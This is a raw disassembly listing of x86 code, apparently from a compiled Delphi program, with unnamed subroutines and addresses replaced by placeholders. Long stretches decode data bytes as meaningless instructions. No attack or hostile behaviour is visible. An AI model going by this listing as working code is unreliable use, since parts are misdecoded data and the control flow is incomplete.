test esi esi
je r-xdata
call sub_403e2c
cmp eax [ esi - 0x4 ]
jb r-xdata
movzx edx [ esi + edx ]
add eax edx
jno r-xdata
movzx eax [ esi + eax ]
push eax
lea ecx [ ebp - 0x4 ]
mov edx 0x5
mov eax esi
call sub_463a00
lea eax [ ebp - 0x30 ]
push eax
mov ecx 0x7fffffff
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_4649fc
mov edx [ ebp - 0x30 ]
mov eax [ ebp - 0x8 ]
call sub_404e98
jmp r-xdata
cmp eax 0xffff
jbe r-xdata
call sub_403e34
movzx eax ax
mov edx [ ebp + 0xc ]
mov [ edx ] eax
add edi 0x2
jno r-xdata
call sub_403e2c
mov eax esi
call sub_406248
sub eax edi
jno r-xdata
call sub_403e34
push eax
mov eax [ ebp + 0x8 ]
mov ecx 0x1
mov edx [ r-xdata ]
call sub_406404
add esp 0x4
push 0x0
mov eax esi
call sub_406248
sub eax edi
jno r-xdata
call sub_403e34
push eax
mov ecx [ ebp + 0x8 ]
mov edx edi
mov eax esi
call sub_463a00
call sub_403e34
sub_47ddb4
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
mov ebx ecx
mov [ ebp - 0x4 ] edx
xor eax eax
push ebp
push sub_47e112
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x400
mov eax [ ebp + 0x8 ]
mov ecx 0x1
mov edx [ r-xdata ]
call sub_406404
add esp 0x4
xor eax eax
mov edx [ ebp + 0x8 ]
mov edx [ edx ]
test edx edx
je r-xdata
call sub_403e2c
cmp eax [ edx - 0x4 ]
jb r-xdata
mov [ edx + eax ] 0x0
mov eax 0x1
mov edx [ ebp + 0x8 ]
mov edx [ edx ]
test edx edx
je r-xdata
call sub_403e2c
cmp eax [ edx - 0x4 ]
jb r-xdata
mov [ edx + eax ] 0x0
mov eax 0x2
mov edx [ ebp + 0x8 ]
mov edx [ edx ]
test edx edx
je r-xdata
call sub_403e2c
cmp eax [ edx - 0x4 ]
jb r-xdata
mov [ edx + eax ] 0x0
lea edx [ ebp - 0x10 ]
mov eax ebx
call sub_463eb4
mov eax [ ebp - 0x10 ]
call sub_405120
test eax eax
jle r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov edx ebx
call sub_46ee14
test al al
je r-xdata
mov eax 0x3
mov edx [ ebp + 0x8 ]
mov edx [ edx ]
test edx edx
je r-xdata
mov eax 0x3
mov edx [ ebp + 0x8 ]
mov edx [ edx ]
test edx edx
je r-xdata
mov eax 0x3
mov edx [ ebp + 0x8 ]
mov edx [ edx ]
test edx edx
je r-xdata
call sub_403e2c
cmp eax [ edx - 0x4 ]
jb r-xdata
call sub_403e2c
cmp eax [ edx - 0x4 ]
jb r-xdata
call sub_403e2c
cmp eax [ edx - 0x4 ]
jb r-xdata
mov [ edx + eax ] 0x4
mov eax 0x4
mov edx [ ebp + 0x8 ]
mov edx [ edx ]
test edx edx
je r-xdata
mov [ edx + eax ] 0x3
mov eax ebx
call sub_405120
cmp eax 0xff
jbe r-xdata
mov [ edx + eax ] 0x1
mov eax 0x4
mov edx [ ebp + 0x8 ]
mov edx [ edx ]
test edx edx
je r-xdata
call sub_403e2c
cmp eax [ edx - 0x4 ]
jb r-xdata
mov edx 0x4
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx ]
test ecx ecx
je r-xdata
call sub_403e2c
call sub_403e2c
cmp eax [ edx - 0x4 ]
jb r-xdata
mov [ edx + eax ] 0x10
mov [ ebp - 0x8 ] 0x5
mov edx ebx
mov eax [ r-xdata ]
call sub_47a954
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_47defa
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0xc ] 0x0
je r-xdata
call sub_403e2c
cmp edx [ ecx - 0x4 ]
jb r-xdata
mov [ edx + eax ] 0x4
mov edx ebx
mov eax [ r-xdata ]
call sub_47a954
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_47dfb9
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0xc ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47df01
lea edx [ ebp - 0xc ]
mov eax [ r-xdata ]
call sub_462560
retn
push 0x4
push 0x10
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0xc ]
call sub_47a5cc
mov eax [ ebp - 0x14 ]
mov ecx [ ebp + 0x8 ]
xor edx edx
call sub_463a00
mov [ ecx + edx ] al
mov [ ebp - 0x8 ] 0x5
mov eax ebx
call sub_405120
test eax eax
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea edx [ ebp - 0xc ]
mov eax [ r-xdata ]
call sub_462560
retn
push 0x4
push 0x4
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0xc ]
call sub_47a5cc
mov eax [ ebp - 0x18 ]
mov ecx [ ebp + 0x8 ]
xor edx edx
call sub_463a00
mov eax ebx
call sub_405120
add [ ebp - 0x8 ] eax
jno r-xdata
mov eax [ ebp - 0x8 ]
push eax
mov eax ebx
call sub_405120
push eax
lea ecx [ ebp - 0x1c ]
mov dl 0x1
mov eax ebx
call sub_4646f0
mov eax [ ebp - 0x1c ]
mov ecx [ ebp + 0x8 ]
xor edx edx
call sub_463a00
mov ebx [ ebp + 0xc ]
cmp ebx 0xffff
jbe r-xdata
call sub_403e34
mov eax [ rw-data ]
mov eax [ eax ]
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov ebx eax
mov eax [ ebp - 0x8 ]
push eax
push 0x2
lea edx [ ebp - 0x20 ]
mov eax ebx
call sub_464878
mov eax [ ebp - 0x20 ]
mov ecx [ ebp + 0x8 ]
xor edx edx
call sub_463a00
add [ ebp - 0x8 ] 0x2
jno r-xdata
call sub_403e2c
mov eax [ ebp - 0x4 ]
call sub_406248
add eax [ ebp - 0x8 ]
jno r-xdata
call sub_403e34
push eax
mov eax [ ebp + 0x8 ]
mov ecx 0x1
mov edx [ r-xdata ]
call sub_406404
add esp 0x4
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_406248
push eax
mov ecx [ ebp + 0x8 ]
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_463a00
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47e119
lea eax [ ebp - 0x20 ]
mov edx [ r-xdata ]
mov ecx 0x4
call sub_405af0
lea eax [ ebp - 0x10 ]
call sub_404e44
retn
call sub_403e34
sub_47df01
add [ ebp - 0x8 ] 0x10
jno r-xdata
jmp r-xdata
call sub_403e34
mov ebx [ ebp + 0xc ]
cmp ebx 0xffff
jbe r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov ebx eax
mov eax [ ebp - 0x8 ]
push eax
push 0x2
lea edx [ ebp - 0x20 ]
mov eax ebx
call sub_464878
mov eax [ ebp - 0x20 ]
mov ecx [ ebp + 0x8 ]
xor edx edx
call sub_463a00
add [ ebp - 0x8 ] 0x2
jno r-xdata
call sub_403e2c
mov eax [ ebp - 0x4 ]
call sub_406248
add eax [ ebp - 0x8 ]
jno r-xdata
call sub_403e34
push eax
mov eax [ ebp + 0x8 ]
mov ecx 0x1
mov edx [ r-xdata ]
call sub_406404
add esp 0x4
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_406248
push eax
mov ecx [ ebp + 0x8 ]
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_463a00
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47e119
lea eax [ ebp - 0x20 ]
mov edx [ r-xdata ]
mov ecx 0x4
call sub_405af0
lea eax [ ebp - 0x10 ]
call sub_404e44
retn
call sub_403e34
sub_47e120
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov esi eax
mov edi [ ebp + 0x14 ]
xor eax eax
push ebp
push sub_47e25c
push [ fs : eax ]
mov [ fs : eax ] esp
movzx eax [ esi + 0xa1 ]
dec eax
sub al 0x2
jae r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
call sub_406248
add eax 0xc8
jno r-xdata
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_406fd4
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4631dc
call sub_4047d8
push eax
lea eax [ ebp - 0x4 ]
mov ecx 0x1
mov edx [ r-xdata ]
call sub_406404
add esp 0x4
mov edx [ ebp + 0x8 ]
mov eax ebx
call sub_474ee4
test al al
jne r-xdata
call sub_403e34
mov eax [ ebp + 0x10 ]
push eax
push 0x0
mov ecx edi
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_474c40
mov ebx eax
push ebx
lea eax [ ebp - 0x4 ]
mov ecx 0x1
mov edx [ r-xdata ]
call sub_406404
add esp 0x4
mov eax [ ebp + 0x10 ]
push eax
lea eax [ ebp - 0x10 ]
push eax
mov ecx edi
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_47da74
mov edx [ ebp - 0x10 ]
lea eax [ ebp - 0x4 ]
mov ecx [ r-xdata ]
call sub_40644c
mov eax [ ebp - 0x4 ]
call sub_406248
mov ebx eax
push 0x0
push ebx
mov ecx [ ebp - 0x8 ]
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_463a00
xor ebx ebx
mov eax edi
call sub_404e44
mov eax [ ebp + 0x10 ]
xor edx edx
mov [ eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47e263
lea eax [ ebp - 0x10 ]
mov edx [ r-xdata ]
call sub_406410
lea eax [ ebp - 0xc ]
call sub_404e44
lea eax [ ebp - 0x4 ]
mov edx [ r-xdata ]
call sub_406410
retn
sub_47e270
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
push esi
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_405314
xor eax eax
push ebp
push sub_47e314
push [ fs : eax ]
mov [ fs : eax ] esp
movzx eax [ ebx + 0xa1 ]
dec eax
sub al 0x2
jae r-xdata
mov eax [ ebp + 0x10 ]
push eax
lea eax [ ebp - 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
mov eax ebx
call sub_47ddb4
push 0xffffffff
xor ecx ecx
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_474c1c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47e31b
lea eax [ ebp - 0xc ]
call sub_404e44
lea eax [ ebp - 0x8 ]
mov edx [ r-xdata ]
call sub_406410
lea eax [ ebp - 0x4 ]
call sub_404e44
retn
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_406fd4
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4631dc
call sub_4047d8
sub_47e324
push ebx
push esi
call sub_404330
mov ebx edx
mov esi eax
lea edx [ esi + 0xa4 ]
mov eax [ r-xdata ]
call sub_462560
mov edx ebx
and dl 0xfc
mov eax esi
call sub_47460c
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4042d8
sub_47e360
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
test ah ah
inc edi
add [ eax + 0x47e4 ] dh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + 0x80047e4 ] dl
add [ eax ] eax
add [ eax + 0x74 ] al
inc edi
add al ch
loope r-xdata
fcomp st6
inc ecx
add [ eax ] cl
loop r-xdata
add [ eax + 0x24004041 ] bh
fild [ ecx ]
rol [ ecx + 0x40 ] 0x0
mov ah 0x41
inc eax
add ah bh
inc eax
add [ eax ] bl
aas
inc eax
add [ eax - 0x53ffb81a ] bl
outsb
inc ecx
add ah ch
fld [ ecx ]
enter 0x416d 0x0
shl ch 0x47
add [ eax - 0x13ffb872 ] al
mov [ edi ] es
call 0xffffffffe4482bb3
out 0x47 eax
add [ ebx + eax * 4 + 0x79a40047 ] bl
inc edi
add [ eax ] bh
add [ edi ] 0x38
jpo r-xdata
add [ eax + 0x50 ] dh
inc esi
add [ ebx + ebp * 8 ] al
inc edi
add [ edi + eax * 2 ] cl
inc edi
add [ edi + eax * 2 + 0x48140047 ] bl
inc edi
add [ eax - 0x19 ] dl
inc edi
add [ eax + ecx * 4 - 0x17b3ffb9 ] dh
inc edi
add [ eax - 0x47ffb87d ] ah
add [ edi ] 0xffffffdc
ja r-xdata
inc edi
add [ eax - 0x80 ] ah
inc edi
add [ eax - 0x17 ] al
inc edi
add ah bl
xchg [ edi ] eax
mov [ edx - 0x7d57ffb9 ] cs
inc edi
add [ eax - 0x27ffb883 ] dl
inc edi
add [ eax - 0x6fffb87e ] ch
jge r-xdata
add [ eax + 0x44004032 ] dl
ja r-xdata
add [ eax ] al
or [ ebx ] 0x0
pop es
inc edx
outsd
arpl [ ebx + 0x65 ] bp
je r-xdata
dec edi
dec eax
popad
outsb
insb
jb r-xdata
dec ecx
add [ eax - 0x7c ] cl
inc edi
add [ eax + 0x74004779 ] cl
jns r-xdata
adc dl [ ecx + ecx * 2 + 0x64 ]
jg r-xdata
add al bl
inc edi
add [ esi + 0x47 ] ch
add [ eax - 0x6fffbfce ] dl
xor al [ eax ]
imul ebp [ edi + 0x6e ] r-xdata
aam 0x0
add dh bh
fadd [ eax ]
add dh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
lldt [ eax ]
push esp
jb r-xdata
dec ecx
push eax
cmp al 0x10
inc eax
add al bl
add [ eax ] al
inc eax
add [ eax + 0x70047e4 ] dh
adc dl [ ecx + ecx * 2 + 0x64 ]
dec ecx
dec edi
dec eax
popad
outsb
insb
jb r-xdata
imul esp [ ebp + 0x74 ] 0xffffff8d
add ah al
js r-xdata
mov dh 0x93
add eax 0x8b000001
outsb
add [ eax ] al
add [ eax ] al
add [ eax ] al
or al 0x0
or [ edx + 0x6f ] eax
jne r-xdata
outsd
arpl [ ebx + 0x65 ] bp
je r-xdata
add [ ecx + ebp * 8 + 0x47 ] bh
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax - 0x2bffbff0 ] dh
add [ eax ] al
add [ edx ] dl
push esp
dec ecx
dec ecx
add [ ecx + edi * 2 ] cl
inc edi
add [ eax - 0x23ffb888 ] dl
add [ eax ] al
popad
jb r-xdata
jae r-xdata
push eax
outsd
jb r-xdata
in eax 0x47
add al dh
out 0x47 al
add [ eax ] dl
out 0x47 eax
add [ eax ] dh
out 0x47 eax
add [ edx + ebp * 8 + 0x47 ] ch
jecxz r-xdata
mov eax [ ebx + 0xd8 ]
mov [ esi + 0x24 ] eax
mov eax [ ebx + 0xe0 ]
mov [ esi + 0xc ] eax
mov eax [ ebx + 0xdc ]
mov [ esi + 0x10 ] eax
mov eax esi
call sub_474c68
movzx edx [ ebx + 0x104 ]
mov eax ebx
call sub_47eaac
mov eax ebx
mov edx [ eax ]
call [ edx + 0xcc ]
pop esi
pop ebx
retn
lea eax [ esi + 0x1c ]
mov edx [ ebx + 0xd4 ]
call sub_404e98
mov eax esi
call sub_474a88
mov eax ebx
mov edx [ eax ]
call [ edx + 0xd0 ]
imul edi edi 0xffffffff
outsb
je r-xdata
jns r-xdata
cmp al 0x10
inc eax
add ah ah
add [ eax ] al
jmp esp
add bh bh
add [ eax ] eax
add [ eax + 0x75 ] bh
inc edi
add [ ecx ] dl
add [ ecx ] dl
dec ecx
dec ecx
dec edi
dec eax
popad
outsb
insb
jb r-xdata
xor ecx ecx
mov edx 0x1
adc bh bh
xchg edx eax
enter 0x0 0x0
jb r-xdata
adc [ eax ] al
add al 0x1
add bh bh
in al 0x0
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
or eax 0x65440b00
popa
jne r-xdata
outsd
arpl [ ebx + 0x65 ] bp
je r-xdata
js r-xdata
adc [ eax ] al
or [ ebp + 0x73 ] dl
dec esi
popad
insb
push ebx
mov ebx eax
mov eax [ ebx + 0xd0 ]
test eax eax
je r-xdata
je r-xdata
outsd
jne r-xdata
add [ eax ] al
call esp
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4207000b ] al
add [ eax - 0x2bffbff0 ] dh
cmp [ ebx + 0xd4 ] 0x0
je r-xdata
add bh bh
xchg esp eax
0x10047 0x0
add [ eax ] dl
inc eax
add [ ecx + eax ] al
mov eax ebx
call sub_4776cc
pop ebx
retn
mov edx [ eax ]
call [ edx + 0x20 ]
outsd
jb r-xdata
fmul [ ebx + 0xd083 ]
add [ ebp - 0x74fa8b40 ] al
adc bh bh
push edx
and [ ebx - 0x6f0c173d ] cl
cmp [ eax ] bh
inc esi
add [ 0x5ff0001 ] al
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
push cs
add [ ecx ] cl
dec ecx
push eax
push esi
jb r-xdata
movzx edx [ ebx + 0x105 ]
mov eax esi
call sub_475108
rol [ eax ] 0x1
add [ eax ] al
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc8 ]
sub_47e5dc
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0xd0 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc8 ]
movzx edx [ ebx + 0x105 ]
mov eax esi
call sub_475108
xor ecx ecx
mov edx 0x1
mov eax esi
call sub_474a88
mov eax ebx
mov edx [ eax ]
call [ edx + 0xd0 ]
cmp [ ebx + 0xd4 ] 0x0
je r-xdata
mov eax [ ebx + 0xd8 ]
mov [ esi + 0x24 ] eax
mov eax [ ebx + 0xe0 ]
mov [ esi + 0xc ] eax
mov eax [ ebx + 0xdc ]
mov [ esi + 0x10 ] eax
mov eax esi
call sub_474c68
movzx edx [ ebx + 0x104 ]
mov eax ebx
call sub_47eaac
mov eax ebx
mov edx [ eax ]
call [ edx + 0xcc ]
pop esi
pop ebx
retn
lea eax [ esi + 0x1c ]
mov edx [ ebx + 0xd4 ]
call sub_404e98
sub_47e66c
push ebx
mov ebx eax
mov eax ebx
call sub_47e928
test al al
je r-xdata
mov eax ebx
call sub_478cd4
test al al
je r-xdata
mov eax ebx
call sub_4783c0
test al al
jne r-xdata
mov al 0x1
pop ebx
retn
xor eax eax
pop ebx
retn
sub_47e698
push ebx
push esi
call sub_404330
mov ebx edx
mov esi eax
mov eax [ esi + 0x100 ]
test eax eax
je r-xdata
lea edx [ esi + 0xd0 ]
mov eax [ r-xdata ]
call sub_462560
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4776e8
test bl bl
jle r-xdata
cmp [ eax + 0x4 ] 0x0
jne r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4042d8
lea edx [ esi + 0x100 ]
mov eax [ r-xdata ]
call sub_462560
sub_47e750
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_47e7c8
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax edi
mov edx [ ebx + 0x94 ]
call sub_404e98
mov esi [ ebx + 0xb0 ]
cmp esi [ ebx + 0xe4 ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47e7cf
lea eax [ ebp - 0x4 ]
call sub_404e44
retn
test esi esi
jle r-xdata
push [ ebx + 0x94 ]
push r-xdata
lea ecx [ ebp - 0x4 ]
mov edx esi
mov eax [ r-xdata ]
call sub_4625b0
push [ ebp - 0x4 ]
mov eax edi
mov edx 0x3
call sub_4051e4
sub_47e7ed
dec [ ebx + 0xd083 ]
add [ ebp + 0x331675c0 ] al
leave
mov dl 0x1
mov eax [ r-xdata ]
call sub_474e08
mov [ ebx + 0xd0 ] eax
jmp r-xdata
mov eax [ ebx + 0xd0 ]
mov edx [ ebx + 0xe0 ]
mov [ eax + 0xc ] edx
mov edx [ ebx + 0xdc ]
mov [ eax + 0x10 ] edx
cmp [ ebx + 0x94 ] 0x0
je r-xdata
pop ebx
retn
cmp [ ebx + 0xb0 ] 0x0
jle r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc4 ]
sub_47e80e
mov dl 0x1
call sub_474fe8
mov eax [ ebx + 0xd0 ]
mov edx [ ebx + 0xe0 ]
mov [ eax + 0xc ] edx
mov edx [ ebx + 0xdc ]
mov [ eax + 0x10 ] edx
cmp [ ebx + 0x94 ] 0x0
je r-xdata
pop ebx
retn
cmp [ ebx + 0xb0 ] 0x0
jle r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc4 ]
sub_47e84c
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_47e90d
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx [ ebp - 0x4 ]
mov edx r-xdata
mov eax [ r-xdata ]
call sub_4625c4
mov ebx eax
test ebx ebx
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47e914
lea eax [ ebp - 0x10 ]
mov edx 0x3
call sub_404e68
retn
lea eax [ ebp - 0x8 ]
push eax
mov ecx ebx
sub ecx 0x1
jno r-xdata
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_405384
mov edx [ ebp - 0x8 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x4c ]
lea eax [ ebp - 0x10 ]
push eax
mov edx ebx
add edx 0x1
jno r-xdata
call sub_403e34
mov ecx 0xff
mov eax [ ebp - 0x4 ]
call sub_405384
mov edx [ ebp - 0x10 ]
lea ecx [ ebp - 0xc ]
mov eax [ r-xdata ]
call sub_4626c4
mov edx [ ebp - 0xc ]
mov ecx [ esi + 0xe4 ]
mov eax [ r-xdata ]
call sub_462668
mov edx eax
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x50 ]
call sub_403e34
sub_47e940
add esp 0xfffffff0
mov [ esp ] cl
mov [ esp + 0x8 ] 0x0
mov [ esp + 0xc ] 0x0
xor ecx ecx
test cl cl
jne r-xdata
mov eax [ esp + 0x8 ]
mov edx [ esp + 0xc ]
add esp 0x10
retn
movzx ecx [ esp ]
call sub_478d84
mov [ esp + 0x8 ] eax
mov [ esp + 0xc ] edx
sub_47e97c
push ebx
push esi
push edi
push ebp
mov esi edx
mov ebx eax
test esi esi
je r-xdata
mov eax [ ebx + 0x100 ]
test eax eax
je r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
xor eax eax
mov [ ebx + 0x100 ] eax
cmp [ eax + 0x4 ] 0x0
jne r-xdata
mov eax [ ebx + 0x100 ]
test eax eax
je r-xdata
mov eax [ ebx + 0x100 ]
test eax eax
je r-xdata
lea edx [ ebx + 0x100 ]
mov eax [ r-xdata ]
call sub_462560
jmp r-xdata
mov eax esi
mov [ ebx + 0x100 ] eax
mov edx ebx
call sub_41db30
jmp r-xdata
cmp [ eax + 0x4 ] 0x0
jne r-xdata
mov eax esi
call sub_403e3c
mov edi eax
mov ebp [ ebx + 0x100 ]
test ebp ebp
je r-xdata
cmp [ eax + 0x4 ] 0x0
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
lea edx [ ebx + 0x100 ]
mov eax [ r-xdata ]
call sub_462560
xor ecx ecx
mov dl 0x1
mov eax edi
call sub_4650b8
mov [ ebx + 0x100 ] eax
mov eax ebp
call sub_403e3c
cmp edi eax
je r-xdata
xor eax eax
mov [ ebx + 0x100 ] eax
mov edx esi
mov eax [ ebx + 0x100 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
jmp r-xdata
lea edx [ ebx + 0x100 ]
mov eax [ r-xdata ]
call sub_462560
xor ecx ecx
mov dl 0x1
mov eax edi
call sub_4650b8
mov [ ebx + 0x100 ] eax
jmp r-xdata
sub_47eaac
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_47e928
test al al
je r-xdata
pop esi
pop ebx
retn
push 0x1
xor bl 0x1
movzx eax bl
push eax
mov eax [ esi + 0xd0 ]
mov edx [ eax + 0x14 ]
mov eax [ rw-data ]
mov eax [ eax ]
mov ecx 0x6
mov ebx [ eax ]
call [ ebx + 0x64 ]
sub_47eb24
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
pushad
in al dx
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x14 ] cl
inc edi
add [ eax ] cl
add [ eax ] eax
add [ ebx + 0x47 ] bl
add al ch
loope r-xdata
fcomp st6
inc ecx
add [ eax ] cl
loop r-xdata
add [ eax + 0x24004041 ] bh
fild [ ecx ]
rol [ ecx + 0x40 ] 0x0
mov ah 0x41
inc eax
add ah bh
inc eax
add [ eax ] bl
aas
inc eax
add [ eax - 0x53ffb81a ] bl
outsb
inc ecx
add ah ch
fld [ ecx ]
enter 0x416d 0x0
shl ch 0x47
add [ eax - 0x13ffb872 ] al
mov [ edi ] es
insb
int1
inc edi
add ah ah
out 0x47 eax
add [ eax - 0xf ] ah
inc edi
add [ ecx + edi * 2 - 0x7cc7ffb9 ] ah
inc edi
add [ eax ] bh
jpo r-xdata
add [ eax + 0x50 ] dh
inc esi
add [ ebx + ebp * 8 ] al
inc edi
add [ edi + eax * 2 ] cl
inc edi
add [ edi + eax * 2 + 0x48140047 ] bl
inc edi
add [ eax - 0x19 ] dl
inc edi
add [ eax + ecx * 4 - 0x17b3ffb9 ] dh
inc edi
add [ eax - 0x47ffb87d ] ah
add [ edi ] 0xffffffdc
ja r-xdata
inc edi
add [ eax - 0x80 ] ah
inc edi
add [ eax - 0x17 ] al
inc edi
add ah bl
xchg [ edi ] eax
mov [ edx - 0x7d57ffb9 ] cs
inc edi
add [ eax - 0x27ffb883 ] dl
inc edi
add [ eax - 0x6fffb87e ] ch
jge r-xdata
add [ eax ] al
inc edi
add [ edi + esi * 2 + 0x47 ] al
add [ eax ] dh
in eax dx
inc edi
add [ esp + esi * 8 + 0x47 ] ah
add al dl
hlt
add [ ebx ] cl
push edx
popad
push esp
imul ebp [ ebp + 0x65 ] 0x8b74756f
rol [ ebp * 8 + 0x47 ] 0x0
je r-xdata
inc edi
add [ eax - 0x7c ] cl
inc edi
add [ eax + 0x74004779 ] cl
jns r-xdata
mov eax eax
pushad
in al dx
jg r-xdata
add al bl
add [ eax ] al
add [ eax ] al
add [ ebp * 8 + 0x47 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
in eax dx
inc edi
add [ eax ] al
add [ edi ] al
adc [ ecx + ecx * 2 + 0x64 ] edx
dec ecx
dec edi
dec eax
popad
outsb
arpl [ ebx - 0x75 ] bp
shl [ eax - 0x14 ] 0x47
in eax dx
inc edi
add [ eax + eax ] cl
add [ eax ] ah
dec edi
inc ecx
add [ ecx + eax * 2 - 0x29c3ffc0 ] ch
inc ecx
add [ ecx + eax * 2 + 0x41c00040 ] bh
inc eax
add [ ecx + eax * 2 + 0x3efc0040 ] dh
inc eax
add [ eax ] bl
aas
inc eax
add al cl
aad 0x41
add al dh
salc
inc ecx
add ah dh
hlt
add [ eax ] al
or al 0xed
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi ] bl
je r-xdata
insb
jb r-xdata
add ah al
js r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
push ds
arpl [ ebx + 0x6c ] bp
jmp r-xdata
push ebx
add [ ecx + ebp * 8 + 0x47 ] bh
add [ ecx ] dl
push esp
dec ecx
dec ecx
dec edi
dec eax
popad
outsb
insb
jb r-xdata
add [ ecx + edi * 2 ] cl
inc edi
add [ eax + 0x18004778 ] dl
out dx eax
inc edi
add al dh
out 0x47 al
add [ eax ] dl
out 0x47 eax
add [ eax ] dh
out 0x47 eax
add [ edx + ebp * 8 + 0x47 ] ch
add [ eax ] al
sub_47eb85
fild [ ecx ]
add dl ah
inc ecx
add ah ah
fiadd [ ecx ]
fcomp st6
inc ecx
add [ eax ] cl
loop r-xdata
shl ch 0x47
add [ eax - 0x13ffb872 ] al
mov [ edi ] es
insb
int1
inc edi
add ah ah
out 0x47 eax
add [ eax - 0xf ] ah
inc edi
add [ ecx + edi * 2 - 0x7cc7ffb9 ] ah
inc edi
add [ eax ] bh
jpo r-xdata
add [ eax + 0x50 ] dh
inc esi
add [ ebx + ebp * 8 ] al
inc edi
add [ edi + eax * 2 ] cl
inc edi
add [ edi + eax * 2 + 0x48140047 ] bl
inc edi
add [ eax - 0x19 ] dl
inc edi
add [ eax + ecx * 4 - 0x17b3ffb9 ] dh
inc edi
add [ eax - 0x47ffb87d ] ah
add [ edi ] 0xffffffdc
ja r-xdata
inc edi
add [ eax - 0x80 ] ah
inc edi
add [ eax - 0x17 ] al
inc edi
add ah bl
xchg [ edi ] eax
mov [ edx - 0x7d57ffb9 ] cs
inc edi
add [ eax - 0x27ffb883 ] dl
inc edi
add [ eax - 0x6fffb87e ] ch
jge r-xdata
add [ eax ] al
inc edi
add [ edi + esi * 2 + 0x47 ] al
add [ eax ] dh
in eax dx
inc edi
